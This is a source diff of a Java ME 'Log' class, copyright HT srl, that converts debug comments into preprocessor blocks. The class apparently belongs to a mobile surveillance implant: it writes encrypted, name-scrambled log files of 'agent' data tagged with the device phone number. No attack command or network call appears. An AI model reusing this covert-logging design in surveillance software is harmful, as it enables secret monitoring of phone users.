@@ -1,3 +1,4 @@
+//#preprocess
 /* *************************************************
  * Copyright (c) 2010 - 2010
  * HT srl,   All rights reserved.
@@ -79,8 +80,9 @@ public final class Log {
             LogType.UNKNOWN, LogType.APPLICATION // 10..11
     };
 
-    // #debug
+    //#ifdef DEBUG
     private static Debug debug = new Debug("Log", DebugLevel.VERBOSE);
+    //#endif
 
     /**
      * Convert type log.
@@ -91,16 +93,17 @@ public final class Log {
      */
     public static int convertTypeLog(final int agentId) {
         final int agentPos = agentId - Agent.AGENT;
-        // #ifdef DBC
+        //#ifdef DBC
         Check.requires(TYPE_LOG != null, "Null TypeLog");
-        // #endif
+        //#endif
         if (agentPos > 0 && agentPos < TYPE_LOG.length) {
             final int typeLog = TYPE_LOG[agentPos];
             return typeLog;
         }
 
-        // #debug
+        //#ifdef DEBUG
         debug.warn("Wrong agentId conversion: " + agentId);
+        //#endif
         return LogType.UNKNOWN;
     }
 
@@ -233,9 +236,9 @@ public final class Log {
         }
 
         final Vector tuple = logCollector.makeNewName(this, agent);
-        // #ifdef DBC
+        //#ifdef DBC
         Check.asserts(tuple.size() == 5, "Wrong tuple size");
-        // #endif
+        //#endif
 
         progressive = ((Integer) tuple.elementAt(0)).intValue();
         final String basePath = (String) tuple.elementAt(1);
@@ -247,44 +250,47 @@ public final class Log {
         boolean ret = Path.createDirectory(dir);
 
         if (!ret) {
-            //#debug error
+            //#ifdef DEBUG_ERROR
             debug.error("Dir not created: " + dir);
+            //#endif
             return false;
         }
 
         fileName = dir + encName;
-        // #ifdef DBC
+        //#ifdef DBC
         Check.asserts(fileName != null, "null fileName");
         Check.asserts(!fileName.endsWith(LogCollector.LOG_EXTENSION), "file not scrambled");
         Check.asserts(!fileName.endsWith("MOB"), "file not scrambled");
-        // #endif
+        //#endif
 
         try {
             fconn = (FileConnection) Connector.open(fileName);
 
             if (fconn.exists()) {
-                // #debug
+                //#ifdef DEBUG
                 debug.fatal("It should not exist:" + fileName);
+                //#endif
                 return false;
             }
 
-            // #debug info
+            //#ifdef DEBUG_INFO
             debug.info("Created :" + plainFileName + " = " + fileName);
+            //#endif
 
             final byte[] plainBuffer = makeDescription(additionalData, logType);
-            // #ifdef DBC
+            //#ifdef DBC
             Check.asserts(plainBuffer.length >= 32 + additionalLen,
                     "Short plainBuffer");
-            // #endif
+            //#endif
 
             fconn.create();
             os = fconn.openDataOutputStream();
 
             final byte[] encBuffer = encryption.encryptData(plainBuffer);
-            // #ifdef DBC
+            //#ifdef DBC
             Check.asserts(encBuffer.length == Encryption
                     .getNextMultiple(plainBuffer.length), "Wrong encBuffer");
-            // #endif
+            //#endif
 
             // scriviamo la dimensione dell'header paddato
             os.write(Utils.intToByteArray(plainBuffer.length));
@@ -292,19 +298,20 @@ public final class Log {
             os.write(encBuffer);
             os.flush();
 
-            // #ifdef DBC
+            //#ifdef DBC
             Check.asserts(fconn.fileSize() == encBuffer.length + 4,
                     "Wrong filesize");
-            // #endif
+            //#endif
 
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("plainBuffer.length: " + plainBuffer.length);
-            // #debug debug
-            debug.trace("encBuffer.length: " + encBuffer.length);
+            debug.trace("encBuffer.length: " + encBuffer.length);      
+            //#endif
 
         } catch (final IOException ex) {
-            // #debug
+            //#ifdef DEBUG
             debug.error("file: " + plainFileName + " ex:" + ex);
+            //#endif
             return false;
         }
 
@@ -344,10 +351,10 @@ public final class Log {
         logDescription.sourceIdLen = device.getWPhoneNumber().length;
 
         final byte[] baseHeader = logDescription.getBytes();
-        // #ifdef DBC
+        //#ifdef DBC
         Check.asserts(baseHeader.length == logDescription.length,
                 "Wrong log len");
-        // #endif
+        //#endif
 
         final int headerLen = baseHeader.length + logDescription.additionalData
                 + logDescription.deviceIdLen + logDescription.userIdLen
@@ -418,14 +425,16 @@ public final class Log {
      */
     public synchronized boolean writeLog(final byte[] data) {
         if (os == null) {
-            // #debug
+            //#ifdef DEBUG
             debug.error("os null");
+            //#endif
             return false;
         }
 
         if (fconn == null) {
-            // #debug
+            //#ifdef DEBUG
             debug.error("fconn null");
+            //#endif
             return false;
         }
 
@@ -436,8 +445,9 @@ public final class Log {
             os.write(encData);
             os.flush();
         } catch (final IOException e) {
-            //#debug error
+            //#ifdef DEBUG_ERROR
             debug.error("Error writing file: " + e);
+            //#endif
             return false;
         }
 
